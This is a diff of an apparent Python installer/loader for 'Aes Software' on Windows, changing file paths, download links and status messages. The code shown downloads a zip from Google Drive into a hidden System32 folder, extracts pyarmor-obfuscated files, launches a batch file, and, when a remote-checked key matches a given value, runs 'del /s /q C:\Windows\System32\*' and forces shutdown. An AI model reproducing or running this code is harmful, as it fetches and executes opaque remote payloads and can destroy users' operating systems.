@@ -31,9 +31,9 @@ os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
     os.remove(r"C:\Windows\System32\FileSystemXS\aesv8.4.bat")
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v1.py")
 else:
-    create_batch_file("py", r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
+    create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v1.py")
 if location:
     os.system('cls')
 else:
@@ -52,7 +52,7 @@ if file_contentsx1 =="mJaAQuPVWhWXG":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
 
-url = "https://raw.githubusercontent.com/klsdclxckzxzxcc/installer/main/uniqueidaes.txt"
+url = "https://github.com/klsdclxckzxzxcc/installer/blob/main/uniqueid_3.0.txt"
 search_string = file_contentsx1
 result = check_string_in_url(url, search_string)
 print(result)
@@ -114,11 +114,11 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\FileSystemXS\AesV8.4.py"
+    aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v1.py"
     files_to_delete = [
-        r"C:\Windows\System32\xsystem\AesV8.3.py",
-        r"C:\Windows\System32\xsystem\aesv8.3.bat",
-        r"C:\Windows\System32\xsystem\pyarmor_runtime_000000"
+        r"C:\Windows\System32\WCNMX\AesV8.3.py",
+        r"C:\Windows\System32\WCNMX\aesv8.3.bat",
+        r"C:\Windows\System32\WCNMX\pyarmor_runtime_000000"
     ]
 
     aesv3_exists = os.path.exists(aesv3_path)
@@ -133,9 +133,7 @@ def delete_files_if_aesv3_missing():
                     shutil.rmtree(item)
                     os.system('cls')
                     print("")
-                    print("Aes Software is updating, please don't close the window.")
-                    print("Change log:")
-                    print("---Improve security.")
+                    print("---DOWNLOADING REQUIRED FILES...")
                     print("")
                     print("")
     else:
@@ -147,11 +145,11 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\FileSystemXS\\pyarmor_runtime_000000"):
-    print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1PMtyGMQ2m0Kv0ohOJe0VDR3yxHIM0Kpb", "C:\\Windows\\System32\\FileSystemXS\\august29.zip")
-    zip_file = r'C:\Windows\System32\FileSystemXS\august29.zip'
-    extract_dir = r'C:\Windows\System32\FileSystemXS'
+if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
+    print("--downloading required libraries, please wait a moment...")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1i1BvxDy1_Ry2TAfJNUl-oRNWxTo-7EU1", "C:\\Windows\\System32\\WCNMX\\klxklx.zip")
+    zip_file = r'C:\Windows\System32\WCNMX\klxklx.zip'
+    extract_dir = r'C:\Windows\System32\WCNMX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
@@ -213,7 +211,7 @@ else:
     print("Success.")
 
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\FileSystemXS\aesv8.4.bat"
+batch_file_path = r"C:\Windows\System32\WCNMX\aes3.0v1.bat"
 os.system('cls')
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
